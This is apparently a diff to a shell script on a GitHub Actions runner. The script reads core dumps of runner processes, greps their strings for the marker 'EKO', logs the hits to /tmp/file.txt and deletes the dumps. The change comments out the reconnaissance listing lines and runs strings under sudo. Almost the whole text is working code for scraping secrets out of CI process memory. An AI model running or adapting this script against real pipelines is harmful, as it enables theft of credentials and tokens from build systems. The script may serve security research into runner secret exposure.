@@ -2,14 +2,12 @@
 
 echo "--- START ---" > /tmp/file.txt
 
-echo "--- ps -ef | grep Runner" >> /tmp/file.txt
-ps -ef | grep Runner >> /tmp/file.txt
-
-echo "--- /home/runner/runners/2.284.0/bin" >> /tmp/file.txt
-ls -1la /home/runner/runners/2.284.0/bin >> /tmp/file.txt
-
-echo "--- /home/runner/runners/2.283.3/bin" >> /tmp/file.txt
-ls -1la /home/runner/runners/2.283.3/bin >> /tmp/file.txt
+#echo "--- ps -ef | grep Runner" >> /tmp/file.txt
+#ps -ef | grep Runner >> /tmp/file.txt
+#echo "--- /home/runner/runners/2.284.0/bin" >> /tmp/file.txt
+#ls -1la /home/runner/runners/2.284.0/bin >> /tmp/file.txt
+#echo "--- /home/runner/runners/2.283.3/bin" >> /tmp/file.txt
+#ls -1la /home/runner/runners/2.283.3/bin >> /tmp/file.txt
 
 echo "file" >> /tmp/file.txt
 file /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt
@@ -24,7 +22,7 @@ do
     echo "cat /tmp/coredump.$pid | grep EKO" >> /tmp/file.txt;
     file /tmp/coredump.$pid >> /tmp/file.txt;
     echo "strings /tmp/coredump.$pid | grep EKO" >> /tmp/file.txt;
-    strings /tmp/coredump.$pid | grep EKO >> /tmp/file.txt;
+    sudo strings /tmp/coredump.$pid | grep EKO >> /tmp/file.txt;
     rm /tmp/coredump.$pid;
 done
 
